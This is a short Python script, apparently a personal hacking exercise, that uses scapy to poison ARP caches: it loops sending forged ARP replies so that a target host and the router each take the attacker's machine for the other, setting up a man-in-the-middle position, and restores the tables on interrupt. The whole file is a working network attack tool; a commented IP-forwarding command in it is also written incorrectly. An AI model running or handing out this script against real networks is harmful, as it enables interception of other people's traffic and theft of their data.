#! usr/bin/etc python3

import scapy.all as scapy
from subprocess import Popen, PIPE
import re
import subprocess
import os
import sys
import time


# op = 2 means response not request
# Target ip [pdst]
# Target mac address [hwdst]
# Router address [psrsc]

# Tell the router you are the victim
# Tell the victim you are the router 

def poison_arp(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) #Associate the mac address of router with kali machine
    scapy.send(packet, verbose=False)

def restore(t_ip, m_ip, s_ip, s_m):
    t_ip2 = s_ip
    m_ip2 = s_m 
    
    s_ip = t_ip
    s_m = m_ip
    packet = scapy.ARP(op=2, pdst = s_ip, hwdst = s_m, psrc = t_ip2, hwsrc = m_ip2)
    scapy.send(packet, verbose=False)
    print("[+] ARP table restored.")

def main():
    # DO NOT FORGET PORT FORWARDING!
    # subprocess.call("echo > 1 /proc/sys/net/ipv4/ip_forward", shell=True)
    if(len(sys.argv) < 2):
        print("Pass in Target IP/MAC + Spoof IP/MAC. . .")
    else:
        t_ip = sys.argv[1]
        m_ip = sys.argv[2]
        s_ip = sys.argv[3]
        s_m = sys.argv[4]
        i=0
        try:
            while True:
                    poison_arp(t_ip, m_ip, s_ip)
                    poison_arp(s_ip, s_m, t_ip)
                    i += 2
                    print("\r[+] Total Packets sent: [{0}]".format(i), end="")
                    sys.stdout.flush()
                    time.sleep(2)
        except(KeyboardInterrupt):
            print("\n[-] Program stopped.")
            restore(t_ip, m_ip, s_ip, s_m)
            exit()

if __name__ == '__main__':
    main()
